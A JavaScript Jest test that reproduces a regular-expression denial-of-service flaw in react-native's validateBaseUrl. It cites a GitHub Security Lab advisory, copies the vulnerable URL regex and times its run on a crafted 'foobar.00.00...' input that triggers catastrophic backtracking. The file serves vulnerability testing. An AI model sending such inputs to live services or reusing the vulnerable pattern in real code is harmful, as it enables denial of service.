//https://securitylab.github.com/advisories/GHSL-2020-293-redos-react-native/
// this dosent have the react native package as such but the function used is what is there in validateBaseUrl of the package.

function validateBaseUrl(url) {
  return /^(?:(?:(?:https?|ftp):)?\/\/)(?:(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,}))?)(?::\d{2,5})?(?:[/?#]\S*)?$/i.test(
    url
  );
}

test("ReDos in react-native", () => {
  const genstr = require("./utils").genstr;
  const measureTime = require("./utils").measureTime;

  let t = measureTime(function () {
    validateBaseUrl(
      "http://foobar.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00."
    ); //20* 00.
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});

//  //const rn = require("react-native");
//rn.validateBaseUrl("http://foobar.00.00.00.00.");
